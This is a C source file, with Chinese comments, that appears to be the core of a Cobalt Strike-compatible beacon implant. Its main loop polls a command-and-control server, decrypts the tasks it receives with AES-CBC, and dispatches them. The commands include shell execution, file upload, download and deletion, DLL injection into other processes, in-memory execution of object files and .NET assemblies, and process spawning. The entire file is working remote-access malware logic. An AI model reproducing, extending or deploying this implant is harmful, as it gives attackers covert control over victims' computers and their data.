#include "MetaData.h"
#include "Util.h"
#include "Http.h"
#include "Config.h"
#include "Command.h"
#include "Job.h"

VOID commandDispatch(unsigned char* command_buffer, uint32_t command_type, size_t command_length);

VOID beacon_main() {
    // Cookie: SESSIONID = Metadata
    wchar_t* cookie_data = makeMetaData();
    if (cookie_data == NULL) {
        fprintf(stderr, "construct metadata failed\n");
        return;
    }
    while (1) {
        // 发送心跳的同时，获取响应内容
        size_t response_size = 0;
		// 处理 Job 任务
        ProcessJobEntry(MAX_PACKET);
        unsigned char* response_encode_data = GET(cookie_data, &response_size);
        // response_size > 7 (response_size > Prefix + Suffix)
        if (!response_encode_data && response_size <= 7) {
            goto SLEEP_NEXT;
        }

        // 多分配一个字节为了放 \0，不然后续 strlen 的长度和 response_size 对不上
        unsigned char* tmp = realloc(response_encode_data, response_size + 1);
        if (!tmp) {
			fprintf(stderr, "Memory reallocation failed\n");
            goto SLEEP_NEXT;
        }

        response_encode_data = tmp;
        response_encode_data[response_size] = '\0';

        size_t response_data_length = 0;

        // 在这个函数还要经过一次 NetBios 解码，一次 XOR 解密对应 Mask，因为 profile 是这样写的
        unsigned char* response_data = parseGetResponse(response_encode_data, response_size, &response_data_length);

        // 确保为 16 的倍数，进行 AES 解密
        if (response_data && response_data_length > 16 && response_data_length % 16 == 0) {
            size_t ciperTextLength = response_data_length;
            unsigned char* ciperText = response_data;

            // 开始解密指令(AES CBC)
            unsigned char* key = g_aeskey;
            size_t cbclength;
            unsigned char* cbcdata = Aes_CBC_Decrypt(ciperText, key, ciperTextLength, &cbclength);

            if (cbcdata != NULL) {
                datap parser;
                BeaconDataParse(&parser, cbcdata, cbclength);
                // 首先的四个字节 不知道是什么commandDispatch
                BeaconDataInt(&parser);
                // 这四个字节是所有指令总长度
                /* 指令数据，当有多条指令发过来时结构如下
                 *  指令数据包格式：?(4 Bytes) |total_length (4 Bytes)| cmdType(4 Bytes) | commandLen(4 Bytes)
                 *  | command_buffer(commandLen Bytes) || cmdType(4 Bytes) | commandLen(4 Bytes) | command_buffer(4 Bytes) || ...
                 */
                uint32_t total_length = (uint32_t)BeaconDataInt(&parser);
                unsigned char* total_buffer = BeaconDataPtr(&parser, total_length);
                
                // 指令数据大小计数
                size_t count = 0;

                while (total_length > 0) {
                    // callbackType 必须有符号
                    int callbackType = 0;
                    uint32_t command_type = 0;
                    size_t command_length = 0;
                    unsigned char* command_buffer = NULL;

                    command_buffer = parsePacket(total_buffer, &total_length, &command_type, &command_length, &count);

                    if (command_buffer) {
                        commandDispatch(command_buffer, command_type, command_length);
                    }
                    else {
                        fprintf(stderr, "command_buffer parse error\n");
						goto SLEEP_NEXT;
                    }
                }
                free(cbcdata);
                cbcdata = NULL;
            }
        }
    SLEEP_NEXT:
        if (response_encode_data) { free(response_encode_data); response_encode_data = NULL; }
        Sleep(g_sleeptime);
    }
    free(cookie_data);
}

int main() {
    beacon_main();
    return 0;
}

 VOID commandDispatch(unsigned char* command_buffer, uint32_t command_type, size_t command_length) {
    unsigned char* post_buffer = NULL;  // 此参数用于 DataProcess
    size_t post_length = 0;             // 此参数用于 DataProcess
    int callbackType = 0;               // 此参数用于 DataProcess 必须有符号 

    switch (command_type) {

    case CMD_TYPE_SLEEP:
        callbackType = CALLBACK_NULL;
        CmdChangSleepTimes(command_buffer, command_length);
        break;
    case CMD_TYPE_FILE_BROWSE:
        callbackType = CALLBACK_PENDING;
        post_buffer = CmdFileBrowse(command_buffer, command_length, &post_length);
        break;
    case CMD_TYPE_UPLOAD_START:
        // 如果文件已存在，会清空原有内容（文件长度变为 0）
        // 如果文件不存在，会新建文件
        // 写入时从文件开头开始写
        callbackType = CALLBACK_OUTPUT;
        post_buffer = CmdUpload(command_buffer, command_length, &post_length, "wb");
        break;
    case CMD_TYPE_UPLOAD_LOOP:
        // 如果文件已存在，写入的位置永远在文件末尾，不会覆盖前面的内容
        // 如果文件不存在，会新建文件
        callbackType = CALLBACK_OUTPUT;
        post_buffer = CmdUpload(command_buffer, command_length, &post_length, "ab");
        break;
    case CMD_TYPE_DRIVES:
        callbackType = CALLBACK_PENDING;
        post_buffer = CmdDrives(command_buffer, command_length, &post_length);
        break;
    case CMD_TYPE_MKDIR:
        callbackType = CALLBACK_OUTPUT;
        post_buffer = CmdMkdir(command_buffer, command_length, &post_length);
        break;
    case CMD_TYPE_PWD:
        callbackType = CALLBACK_PWD;
        post_buffer = CmdPwd(&post_length);
        break;
    case CMD_TYPE_CD:
        callbackType = CALLBACK_OUTPUT;
        post_buffer = CmdCd(command_buffer, command_length, &post_length);
        break;
    case CMD_TYPE_GETUID:
        callbackType = CALLBACK_TOKEN_GETUID;
        post_buffer = CmdGetUid(&post_length);
        break;
    case CMD_TYPE_SETENV:
        callbackType = CALLBACK_OUTPUT;
        post_buffer = CmdSetEnv(command_buffer, command_length, &post_length);
        break;
    case CMD_TYPE_RM:
        callbackType = CALLBACK_OUTPUT;
        post_buffer = CmdFileRemove(command_buffer, command_length, &post_length);
        break;
    case CMD_TYPE_GET_PRIVS:
        callbackType = CALLBACK_OUTPUT;
        post_buffer = CmdGetPrivs(&post_length);
        break;
    case CMD_TYPE_CP:
        callbackType = CALLBACK_OUTPUT;
        post_buffer = CmdFileCopy(command_buffer, command_length, &post_length);
        break;
    case CMD_TYPE_MV:
        callbackType = CALLBACK_OUTPUT;
        post_buffer = CmdFileMove(command_buffer, command_length, &post_length);
        break;
    case CMD_TYPE_DOWNLOAD:
        callbackType = CALLBACK_NULL;
        CmdFileDownload(command_buffer, command_length, &post_length);
        break;
    case CMD_TYPE_SHELL:
        callbackType = CALLBACK_NULL;
        /*
         * 因为 CmdShell 中会创建线程，线程中会使用 command_buffer
         * 线程结束前，会自动释放 command_buffer
         * 如果提前释放 command_buffer 会导致线程访问已释放内存(UAF)
         * 继而报错
        */
        CmdShell(command_buffer, command_length);
        break;
    case CMD_TYPE_BOF:
        callbackType = CALLBACK_NULL;
        CmdInlineExecute(command_buffer, command_length);
        break;
    case CMD_TYPE_EXIT:
        exit(-1);
    case CMD_TYPE_PS:
        callbackType = CALLBACK_NULL;
        CmdPs(command_buffer, command_length);
        break;
    case CMD_TYPE_SPAWN_X64:
        callbackType = CALLBACK_NULL;
        CmdSpawn(command_buffer, command_length, FALSE, TRUE);
        break;
    case CMD_TYPE_PIPE:
        callbackType = CALLBACK_NULL;
        CmdJobRegister(command_buffer, command_length, FALSE, FALSE);
        break;
    case CMD_TYPE_JOB_REGISTER_MSGMODE:
        callbackType = CALLBACK_NULL;
        CmdJobRegister(command_buffer, command_length, FALSE, TRUE);
        break;
    case CMD_TYPE_INJECT_X64:
        callbackType = CALLBACK_NULL;
        CmdDllInject(command_buffer, command_length, FALSE);
        break;
    case CMD_TYPE_INJECT_X86:
        callbackType = CALLBACK_NULL;
        CmdDllInject(command_buffer, command_length, TRUE);
        break;
    case CMD_TYPE_JOBS:
        callbackType = CALLBACK_JOBS;
        post_buffer = CmdJobList(&post_length);
        break;
    case CMD_TYPE_JOBS_KILL:
        callbackType = CALLBACK_OUTPUT;
        post_buffer = CmdJobKill(command_buffer, command_length, &post_length);
        break;
    case CMD_TYPE_EXECUTE_ASSEMBLY_X64:
        callbackType = CALLBACK_NULL;
        CmdExecuteAssembly(command_buffer, command_length);
        break;
    default:
        callbackType = CALLBACK_OUTPUT;
        unsigned char* result = "[-] This Command Don't Accomplished.";
        unsigned char* post_buffer = (unsigned char*)malloc(strlen(result));
        if (!post_buffer) {
            fprintf(stderr, "Memory allocation failed\n");
            return;
        }
        memcpy(post_buffer, result, strlen(result));
        post_length = strlen(result);
        break;
    }   

    // 有数据返回进入下面分支
    if (callbackType >= 0 && post_buffer) {
        DataProcess(post_buffer, post_length, callbackType);
        free(post_buffer);
    }
}
